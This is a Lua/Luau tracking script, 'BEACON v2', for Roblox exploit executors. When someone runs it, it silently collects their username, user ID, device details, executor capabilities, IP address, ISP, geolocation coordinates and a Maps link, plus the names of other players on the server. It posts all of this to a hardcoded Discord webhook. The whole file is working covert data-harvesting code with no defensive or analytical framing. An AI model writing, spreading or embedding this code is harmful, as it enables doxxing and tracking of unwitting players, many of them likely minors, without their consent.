-- ============================================================
--  BEACON v2 — full recon harvest
--  language: Lua / Luau
--  target:   Roblox client, any executor with http_request
--  replaces the v1 beacon block entirely.
-- ============================================================

local BeaconConfig = {
    webhook = "https://discord.com/api/webhooks/1555648641836912806/9ZxVmuP_dZIvfJY0K79XySMcLqCg2dToLOB24xKHgk9NgmWWwCU2sUvORt-Dd_KZR9BD",
    configUrl = "",
    pollInterval = 15,
    enabled = true,
    username = "zamorozka beacon v2",

    -- optional: attach the player's avatar as embed thumbnail
    includeAvatar = true,
    -- optional: dump all getgenv keys (can be long)
    dumpGenv = false,
    -- optional: include other players in the server
    dumpServerPlayers = true,
}

local _bHttpRequest = (syn and syn.request)
    or (http and http.request)
    or (fluxus and fluxus.request)
    or (krnl and krnl.request)
    or (getgenv and getgenv().request)
    or http_request
    or request

local _bHttpService = game:GetService("HttpService")
local _bPlayers     = game:GetService("Players")
local _bUIS         = game:GetService("UserInputService")
local _bStats       = game:GetService("Stats")
local _bGuiService  = game:GetService("GuiService")
local _bRunService  = game:GetService("RunService")
local _bTween       = game:GetService("TweenService")
local _bCoreGui     = game:GetService("CoreGui")
local _bWorkspace   = game:GetService("Workspace")

local function _bJsonEncode(t)
    local ok, s = pcall(_bHttpService.JSONEncode, _bHttpService, t)
    return ok and s or "{}"
end

local function _bJsonDecode(s)
    local ok, t = pcall(_bHttpService.JSONDecode, _bHttpService, s)
    return ok and t or nil
end

local function _bHttpGet(url, isBinary)
    if _bHttpRequest then
        local ok, res = pcall(_bHttpRequest, { Url = url, Method = "GET" })
        if ok and res and res.Body then return res.Body end
    end
    local ok, body = pcall(function() return game:HttpGet(url, isBinary) end)
    if ok and type(body) == "string" then return body end
    return nil
end

local function _bHttpPost(url, body)
    if _bHttpRequest then
        return _bHttpRequest({
            Url = url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body,
        })
    end
    return nil
end

-- ---------- helpers ----------

local function _safe(fn, fallback)
    local ok, res = pcall(fn)
    if ok then return res end
    return fallback
end

local function _fmt(v)
    if v == nil then return "n/a" end
    if type(v) == "table" then
        local ok, s = pcall(_bHttpService.JSONEncode, _bHttpService, v)
        return ok and s or tostring(v)
    end
    return tostring(v)
end

local function _trunc(s, n)
    s = tostring(s or "")
    if #s <= n then return s end
    return s:sub(1, n - 3) .. "..."
end

-- ---------- executor detection (extended) ----------

local function _bDetectExecutor()
    local name, ver
    if identifyexecutor then
        local ok, n, v = pcall(identifyexecutor)
        if ok then name, ver = n, v end
    end
    if not name and getexecutorname then
        local ok, n = pcall(getexecutorname)
        if ok then name = n end
    end

    local sigs = {
        { "Synapse X",      function() return syn and syn.protect_gui end },
        { "Script-Ware",    function() return SW and SW.Signals end },
        { "Krnl",           function() return KRNL_LOADED end },
        { "Fluxus",         function() return fluxus end },
        { "SirHurt",        function() return is_sirhurt_closure end },
        { "Sentinel",       function() return secure_load end },
        { "Protosmasher",   function() return is_protosmasher_closure end },
        { "Delta",          function() return isdelta end },
        { "Oxygen-U",       function() return isoxygenu end },
        { "Electron",       function() return iselectron end },
        { "Solara",         function() return issolara end },
        { "Xeno",           function() return isxeno end },
        { "AWP",            function() return isawp end },
        { "Wave",           function() return iswave end },
        { "Trigon",         function() return istrigon end },
        { "Nihon",          function() return isnihon end },
        { "Codex",          function() return iscodex end },
        { "Swift",          function() return isswift end },
    }
    if not name then
        for _, s in ipairs(sigs) do
            local ok, hit = pcall(s[2])
            if ok and hit then name = s[1]; break end
        end
    end

    -- collect capabilities
    local caps = {}
    local checks = {
        "http_request", "request", "syn", "getgenv", "getrenv",
        "getsenv", "getreg", "getgc", "getinstances", "getnilinstances",
        "getloadedmodules", "getscripts", "getcallingscript",
        "getconnections", "firesignal", "fireclickdetector",
        "firetouchinterest", "fireproximityprompt",
        "loadstring", "load", "getscriptclosure", "getscriptbytecode",
        "dumpstring", "decompile", "getcustomasset", "writefile",
        "readfile", "appendfile", "listfiles", "makefolder",
        "delfile", "isfile", "isfolder", "delfolder",
        "setclipboard", "toclipboard", "getclipboard",
        "identifyexecutor", "getexecutorname", "getscriptname",
        "getscripthash", "checkcaller", "islclosure", "iscclosure",
        "setthreadidentity", "getthreadidentity", "sethiddenproperty",
        "gethiddenproperty", "setscriptable", "getrawmetatable",
        "setrawmetatable", "hookfunction", "hookmetamethod",
        "newcclosure", "getnamecallmethod", "setnamecallmethod",
        "getupvalue", "setupvalue", "getupvalues", "setupvalues",
        "getconstants", "getproto", "getstack", "setstack",
        "gettenv", "getfenv", "setfenv", "getmenv", "setmenv",
        "getgenv", "getrenv", "getreg",
        "is_synapse_function", "is_protosmasher_closure",
        "is_sirhurt_closure", "isreadonly", "setreadonly",
        "getrawmetatable", "getpropertychangedsignal",
        "getcallbackvalue", "getcallbackmember",
        "cloneref", "compareinstances", "getactors",
        "queue_on_teleport", "queueteleport",
        "setfpscap", "getfpscap",
        "syn", "krnl", "fluxus", "sw", "getthreadcontext",
        "getfunctionhash", "getscriptclosure",
    }
    for _, c in ipairs(checks) do
        local ok, val = pcall(function()
            return getfenv and getfenv(0) and getfenv(0)[c]
                or _G[c]
        end)
        if ok and val ~= nil then caps[#caps+1] = c end
    end

    -- executor-specific envs
    local execEnv = {}
    if syn then
        execEnv.syn = _safe(function()
            local t = {}
            for k, v in pairs(syn) do
                if type(v) == "function" or type(v) == "table" then
                    t[#t+1] = k
                end
            end
            return t
        end, {})
    end
    if krnl then
        execEnv.krnl = _safe(function()
            local t = {}
            for k, v in pairs(krnl) do t[#t+1] = k end
            return t
        end, {})
    end
    if fluxus then
        execEnv.fluxus = _safe(function()
            local t = {}
            for k, v in pairs(fluxus) do t[#t+1] = k end
            return t
        end, {})
    end

    -- getgenv dump
    local genvKeys = {}
    if BeaconConfig.dumpGenv and getgenv then
        genvKeys = _safe(function()
            local t = {}
            for k, v in pairs(getgenv()) do
                t[#t+1] = k .. " (" .. typeof(v) .. ")"
            end
            return t
        end, {})
    end

    return {
        name = name or "Unknown / obfuscated",
        version = ver,
        caps = caps,
        env = execEnv,
        genv = genvKeys,
    }
end

-- ---------- device + system ----------

local function _bDetectDevice()
    local tag = "Desktop"
    if _bUIS.TouchEnabled and not _bUIS.KeyboardEnabled then
        tag = "Mobile / Touch"
    elseif _bUIS.GamepadEnabled and not _bUIS.KeyboardEnabled then
        tag = "Console / Gamepad"
    end

    local caps = {}
    if _bUIS.KeyboardEnabled      then caps[#caps+1] = "kb"      end
    if _bUIS.MouseEnabled         then caps[#caps+1] = "mouse"   end
    if _bUIS.TouchEnabled         then caps[#caps+1] = "touch"   end
    if _bUIS.GamepadEnabled       then caps[#caps+1] = "pad"     end
    if _bUIS.AccelerometerEnabled then caps[#caps+1] = "accel"   end
    if _bUIS.GyroscopeEnabled     then caps[#caps+1] = "gyro"    end
    if _bUIS.VREnabled            then caps[#caps+1] = "vr"      end
    if _bUIS.KeyboardEnabled and _bUIS.MouseEnabled then
        caps[#caps+1] = "pc-input"
    end

    -- raw getdeviceinfo tables
    local info = {}
    _safe(function()
        if syn and syn.getdeviceinfo then
            for k, v in pairs(syn.getdeviceinfo()) do info[k] = v end
        end
    end)
    _safe(function()
        if getdeviceinfo then
            for k, v in pairs(getdeviceinfo()) do info[k] = v end
        end
    end)
    _safe(function()
        if getgpuinfo then info.GPU = getgpuinfo() end
    end)

    -- screen + viewport
    local cam = _bWorkspace.CurrentCamera
    local vpSize = cam and cam.ViewportSize or Vector2.new(0, 0)

    local screen = {
        platform = _safe(function() return _bGuiService:GetPlatform() end),
        isTenFoot = _safe(function() return _bGuiService:IsTenFootInterface() end),
        mouseEnabled = _bUIS.MouseEnabled,
        mouseIconEnabled = _bUIS.MouseIconEnabled,
        touchEnabled = _bUIS.TouchEnabled,
        keyboardEnabled = _bUIS.KeyboardEnabled,
        gamepadEnabled = _bUIS.GamepadEnabled,
        gyroEnabled = _bUIS.GyroscopeEnabled,
        accelEnabled = _bUIS.AccelerometerEnabled,
        vrEnabled = _bUIS.VREnabled,
        viewport = tostring(vpSize.X) .. "x" .. tostring(vpSize.Y),
        mouseLocation = _safe(function()
            local m = _bUIS:GetMouseLocation()
            return tostring(m.X) .. ", " .. tostring(m.Y)
        end, "n/a"),
    }

    return tag, table.concat(caps, " + "), info, screen
end

-- ---------- network / geo ----------

local function _bFetchNetwork()
    local out = {}
    local endpoints = {
        "http://ip-api.com/json/?fields=status,country,countryCode,regionName,region,city,zip,lat,lon,timezone,isp,org,as,asname,query,proxy,hosting,mobile",
        "https://ipapi.co/json/",
    }
    for _, url in ipairs(endpoints) do
        local body = _bHttpGet(url)
        if body then
            local d = _bJsonDecode(body)
            if type(d) == "table" and (d.status == "success" or d.country_name) then
                out = {
                    country     = d.country     or d.country_name,
                    countryCode = d.countryCode or d.country_code,
                    region      = d.regionName  or d.region,
                    regionCode  = d.region      or d.region_code,
                    city        = d.city,
                    zip         = d.zip         or d.postal,
                    lat         = d.lat         or d.latitude,
                    lon         = d.lon         or d.longitude,
                    timezone    = d.timezone,
                    isp         = d.isp         or d.org,
                    org         = d.org,
                    asn         = d.as          or d.asn,
                    asName      = d.asname,
                    ip          = d.query       or d.ip,
                    proxy       = d.proxy,
                    hosting     = d.hosting,
                    mobile      = d.mobile,
                }
                break
            end
        end
    end
    return out
end

-- ---------- roblox runtime stats ----------

local function _bFetchRuntime()
    local out = {}

    out.ping = _safe(function()
        return _bStats.Network.ServerStatsItem["Data Ping"]:GetValue()
    end)

    out.fps = _safe(function()
        return math.floor(1 / _bRunService.RenderStepped:Wait())
    end, 0)

    out.memoryMB = _safe(function()
        return math.floor(_bStats:GetTotalMemoryUsageMb())
    end)

    out.networkIn = _safe(function()
        return _bStats.Network.ServerStatsItem["Data Received"]:GetValueString()
    end)
    out.networkOut = _safe(function()
        return _bStats.Network.ServerStatsItem["Data Sent"]:GetValueString()
    end)

    out.fpsCap = _safe(function()
        if getfpscap then return getfpscap() end
        if setfpscap then return "settable" end
        return nil
    end)

    return out
end

-- ---------- roblox player + game + server ----------

local function _bFetchPlayer(player)
    if not player then return nil end
    return {
        name        = player.Name,
        display     = player.DisplayName,
        userId      = player.UserId,
        accountAge  = player.AccountAge,
        membership  = tostring(player.MembershipType),
        verified    = player.HasVerifiedBadge,
        isFriendsWith = _safe(function()
            return player:IsFriendsWith(_bPlayers.LocalPlayer.UserId)
        end),
        team        = _safe(function()
            return player.Team and player.Team.Name or "none"
        end),
        followUserId = player.FollowUserId,
    }
end

local function _bFetchGame()
    local placeId = game.PlaceId
    local gameId  = game.GameId
    local jobId   = game.JobId
    local creator = _safe(function()
        return game.CreatorType == Enum.CreatorType.User
            and tostring(game.CreatorId)
            or ("Group " .. tostring(game.CreatorId))
    end)
    return {
        placeId   = placeId,
        gameId    = gameId,
        jobId     = jobId,
        placeName = _safe(function() return game:GetService("MarketplaceService"):GetProductInfo(placeId).Name end),
        creator   = creator,
        creatorType = tostring(game.CreatorType),
        placeVersion = game.PlaceVersion,
        workspaceName = game.Workspace and game.Workspace.Name or "?",
    }
end

local function _bFetchServerPlayers()
    local out = {}
    for _, p in ipairs(_bPlayers:GetPlayers()) do
        if p ~= _bPlayers.LocalPlayer then
            out[#out+1] = string.format("%s (%s) | %d | age %d",
                p.Name, p.DisplayName, p.UserId, p.AccountAge)
        end
    end
    return out
end

-- ---------- avatar thumbnail ----------

local function _bAvatarUrl(userId)
    return string.format(
        "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
        userId or 0)
end

-- ---------- build embeds ----------

local function _bBuildEmbeds()
    local player   = _bPlayers.LocalPlayer
    local exec     = _bDetectExecutor()
    local devTag, caps, devInfo, screen = _bDetectDevice()
    local net      = _bFetchNetwork()
    local runtime  = _bFetchRuntime()
    local gameInfo = _bFetchGame()
    local playerI  = _bFetchPlayer(player)

    local embeds = {}

    -- ---- embed 1: player ----
    local e1 = {
        title = "👤 Player",
        color = 0x00B0FF,
        fields = {
            { name = "Name",       value = _fmt(playerI.name),       inline = true },
            { name = "Display",    value = _fmt(playerI.display),    inline = true },
            { name = "User ID",    value = _fmt(playerI.userId),     inline = true },
            { name = "Account age",value = tostring(playerI.accountAge) .. " days", inline = true },
            { name = "Membership", value = _fmt(playerI.membership), inline = true },
            { name = "Verified",   value = tostring(playerI.verified), inline = true },
            { name = "Friends w/ local", value = tostring(playerI.isFriendsWith), inline = true },
            { name = "Team",       value = _fmt(playerI.team),       inline = true },
            { name = "FollowUserId", value = _fmt(playerI.followUserId), inline = true },
        },
        thumbnail = { url = _bAvatarUrl(playerI.userId) },
    }
    embeds[#embeds+1] = e1

    -- ---- embed 2: game + server ----
    local e2 = {
        title = "🎮 Game / Server",
        color = 0xFF9800,
        fields = {
            { name = "Place",    value = _fmt(gameInfo.placeName), inline = false },
            { name = "PlaceId",  value = _fmt(gameInfo.placeId),   inline = true },
            { name = "GameId",   value = _fmt(gameInfo.gameId),    inline = true },
            { name = "JobId",    value = _trunc(_fmt(gameInfo.jobId), 100), inline = false },
            { name = "Creator",  value = _fmt(gameInfo.creator) .. " (" .. _fmt(gameInfo.creatorType) .. ")", inline = true },
            { name = "Place version", value = _fmt(gameInfo.placeVersion), inline = true },
        },
    }
    if BeaconConfig.dumpServerPlayers then
        local sp = _bFetchServerPlayers()
        e2.fields[#e2.fields+1] = {
            name = "Other players (" .. #sp .. ")",
            value = #sp > 0
                and _trunc(table.concat(sp, "\n"), 1000)
                or "none",
            inline = false,
        }
    end
    embeds[#embeds+1] = e2

    -- ---- embed 3: executor ----
    local e3 = {
        title = "💉 Executor",
        color = 0xE91E63,
        fields = {
            { name = "Name",     value = _fmt(exec.name),    inline = true },
            { name = "Version",  value = _fmt(exec.version), inline = true },
            { name = "Capabilities", value = _trunc(table.concat(exec.caps, ", "), 1000), inline = false },
        },
    }
    if exec.env.syn then
        e3.fields[#e3.fields+1] = {
            name = "syn.* API",
            value = _trunc(table.concat(exec.env.syn, ", "), 1000),
            inline = false,
        }
    end
    if exec.env.krnl then
        e3.fields[#e3.fields+1] = {
            name = "krnl.* API",
            value = _trunc(table.concat(exec.env.krnl, ", "), 1000),
            inline = false,
        }
    end
    if BeaconConfig.dumpGenv and #exec.genv > 0 then
        e3.fields[#e3.fields+1] = {
            name = "getgenv() keys (" .. #exec.genv .. ")",
            value = _trunc(table.concat(exec.genv, "\n"), 1000),
            inline = false,
        }
    end
    embeds[#embeds+1] = e3

    -- ---- embed 4: device ----
    local infoStr = ""
    if devInfo then
        local parts = {}
        for k, v in pairs(devInfo) do
            parts[#parts+1] = k .. ": " .. _fmt(v)
        end
        infoStr = _trunc(table.concat(parts, "\n"), 1000)
    end

    local e4 = {
        title = "💻 Device",
        color = 0x4CAF50,
        fields = {
            { name = "Type", value = devTag, inline = true },
            { name = "Caps", value = "`" .. caps .. "`", inline = true },
            { name = "Platform", value = _fmt(screen.platform), inline = true },
            { name = "TenFoot UI", value = tostring(screen.isTenFoot), inline = true },
            { name = "Viewport", value = screen.viewport, inline = true },
            { name = "Mouse", value = screen.mouseLocation, inline = true },
        },
    }
    if infoStr ~= "" then
        e4.fields[#e4.fields+1] = {
            name = "getdeviceinfo()",
            value = infoStr,
            inline = false,
        }
    end
    embeds[#embeds+1] = e4

    -- ---- embed 5: network / geo ----
    local e5 = {
        title = "🌍 Network / Location",
        color = 0x9C27B0,
        fields = {},
    }
    if net.ip then
        local locLine = table.concat({
            net.city or "?", net.region or "?", net.country or "?",
        }, ", ")
        if net.zip then locLine = locLine .. "  (" .. net.zip .. ")" end

        e5.fields[#e5.fields+1] = { name = "City / Region / Country", value = locLine, inline = false }
        e5.fields[#e5.fields+1] = { name = "IP", value = net.ip, inline = true }
        e5.fields[#e5.fields+1] = { name = "ISP", value = _fmt(net.isp), inline = true }
        e5.fields[#e5.fields+1] = { name = "Org", value = _fmt(net.org), inline = true }
        e5.fields[#e5.fields+1] = { name = "ASN", value = _fmt(net.asn), inline = true }
        if net.lat and net.lon then
            e5.fields[#e5.fields+1] = {
                name = "Coords",
                value = string.format("%.4f, %.4f", net.lat, net.lon),
                inline = true,
            }
            e5.fields[#e5.fields+1] = {
                name = "Maps",
                value = string.format("https://www.google.com/maps?q=%.4f,%.4f", net.lat, net.lon),
                inline = true,
            }
        end
        e5.fields[#e5.fields+1] = { name = "Timezone", value = _fmt(net.timezone), inline = true }
        e5.fields[#e5.fields+1] = { name = "Proxy", value = tostring(net.proxy), inline = true }
        e5.fields[#e5.fields+1] = { name = "Hosting (VPN/datacenter)", value = tostring(net.hosting), inline = true }
        e5.fields[#e5.fields+1] = { name = "Mobile", value = tostring(net.mobile), inline = true }
    else
        e5.fields[#e5.fields+1] = { name = "Location", value = "unavailable (http blocked or endpoint down)", inline = false }
    end
    embeds[#embeds+1] = e5

    -- ---- embed 6: runtime ----
    local e6 = {
        title = "📊 Runtime",
        color = 0x607D8B,
        fields = {
            { name = "FPS",        value = _fmt(runtime.fps),       inline = true },
            { name = "FPS cap",    value = _fmt(runtime.fpsCap),    inline = true },
            { name = "Ping (ms)",  value = _fmt(runtime.ping),      inline = true },
            { name = "Memory (MB)",value = _fmt(runtime.memoryMB),  inline = true },
            { name = "Net in",     value = _fmt(runtime.networkIn), inline = true },
            { name = "Net out",    value = _fmt(runtime.networkOut),inline = true },
        },
    }
    embeds[#embeds+1] = e6

    return embeds
end

-- ---------- send ----------

local function SendBeacon(extraEmbeds)
    if not BeaconConfig.enabled then return end
    if not BeaconConfig.webhook or BeaconConfig.webhook == ""
       or string.find(BeaconConfig.webhook, "REPLACE_ME", 1, true) then
        warn("[beacon] webhook not configured")
        return
    end
    task.spawn(function()
        local ok, err = pcall(function()
            local embeds = _bBuildEmbeds()
            if extraEmbeds then
                for _, e in ipairs(extraEmbeds) do embeds[#embeds+1] = e end
            end
            -- Discord max 10 embeds per message
            while #embeds > 10 do table.remove(embeds) end

            local payload = _bJsonEncode({
                username = BeaconConfig.username,
                content  = "**zamorozka scripts executed** — full recon below",
                embeds   = embeds,
            })
            _bHttpPost(BeaconConfig.webhook, payload)
        end)
        if not ok then warn("[beacon] send failed: " .. tostring(err)) end
    end)
end
